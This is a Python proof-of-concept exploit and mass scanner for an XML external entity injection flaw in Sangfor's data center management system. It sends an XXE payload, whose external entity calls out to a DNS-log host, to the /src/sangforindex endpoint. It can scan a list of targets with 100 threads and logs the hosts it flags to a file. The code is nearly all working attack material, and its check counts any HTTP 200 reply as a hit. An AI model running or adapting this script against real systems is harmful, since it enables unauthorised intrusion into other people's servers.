#深信服数据中心管理系统 XML 实体注入漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """          _____                                            _____          
         /\    \                 ______                   /\    \         
        /::\    \               |::|   |                 /::\    \        
       /::::\    \              |::|   |                /::::\    \       
      /::::::\    \             |::|   |               /::::::\    \      
     /:::/\:::\    \            |::|   |              /:::/\:::\    \     
    /:::/__\:::\    \           |::|   |             /:::/__\:::\    \    
    \:::\   \:::\    \          |::|   |            /::::\   \:::\    \   
  ___\:::\   \:::\    \         |::|   |           /::::::\   \:::\    \  
 /\   \:::\   \:::\    \  ______|::|___|___ ____  /:::/\:::\   \:::\    \ 
/::\   \:::\   \:::\____\|:::::::::::::::::|    |/:::/  \:::\   \:::\____\
\:::\   \:::\   \::/    /|:::::::::::::::::|____|\::/    \:::\   \::/    /
 \:::\   \:::\   \/____/  ~~~~~~|::|~~~|~~~       \/____/ \:::\   \/____/ 
  \:::\   \:::\    \            |::|   |                   \:::\    \     
   \:::\   \:::\____\           |::|   |                    \:::\____\    
    \:::\  /:::/    /           |::|   |                     \::/    /    
     \:::\/:::/    /            |::|   |                      \/____/     
      \::::::/    /             |::|   |                                  
       \::::/    /              |::|   |                                  
        \::/    /               |::|___|                                  
         \/____/                 ~~                                                                                                               
                                                                author :CHKer
                                                                version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服数据中心管理系统 XML 实体注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/src/sangforindex"
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)',
        'Accept':'text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'text/xml',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'Keep-alive',
        'Content-Length': '135'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = """<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE root [
<!ENTITY rootas SYSTEM "http://dnslog">
]>
<xxx>
&rootas;
</xxx>"""
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result48.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()